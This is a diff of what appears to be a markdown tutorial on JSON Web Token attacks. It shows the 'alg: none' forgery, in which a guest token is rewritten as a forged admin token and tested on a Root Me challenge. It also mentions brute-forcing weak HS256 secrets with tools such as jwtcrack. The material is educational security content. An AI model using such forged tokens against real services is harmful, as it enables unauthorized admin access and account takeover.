@@ -18,8 +18,9 @@ The signature is crafted using a secret - "Azerty123" in our case.
 
 The "header", "payload" and "signature" parts are then encoded using base64url.
 
-Complete JWT :
-```diff
+The complete JWT is a concatenation of these three parts, separated by a point (exception for the 'none' algorithm, which only has 2 parts - header and payload).
+
+```
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSnVsaWVuRmluayIsImlhdCI6MTUzMzc3NzQzOH0.KJFzGjs_75Q56mY9QXqpEKU-wE2o3ufF3ZxfIUaexwI
 ```
 
@@ -33,7 +34,7 @@ Useful links for an overall understanding :
 Let us assume you don't have an account on a website, you don't want to create one and you decide to log in as a guest.
 A JWT is assigned to your newly created session:
 
-```diff
+```
 eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6Imd1ZXN0In0.
 {"typ":"JWT","alg":"none"}.{"username":"guest"}.
 ```
@@ -43,7 +44,7 @@ eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6Imd1ZXN0In0.
 
 What would happen if we decided to change the value of the username to "admin" ? We would get a new valid JWT and thus get access to the admin section.
 
-```diff
+```
 eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.
 {"typ":"JWT","alg":"none"}.{"username":"admin"}.
 ```
@@ -56,13 +57,13 @@ eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.
 
 What if we decided to change the algorithm to 'none' in the header part in order to exploit the previous vulnerability ? Let us try the following on a Root Me challenge...
 
-```diff
+```
 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk
 {"typ":"JWT","alg":"HS256"}.{"username":"guest"}.'a signature crafted using a secret unknown to us'
 ```
 
 We can craft our own JWT :
-```diff
+```
 eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.
 {"typ":"JWT","alg":"none"}.{"username":"admin"}.
 ```
@@ -78,5 +79,13 @@ Works !
 ```
 
 * ### Brute forcing HS256 secret key
+
+The HS256 algorithm uses a secret value to define the signature like so :
+```
+HMACSHA256(concatenation, 'my_very_secret_key')
+```
+If the secret key is weak enough, we can brute force it using several tools like 'jwtcrack' :
+
+
 
 * ### Substitution attack for RS256 algorithm
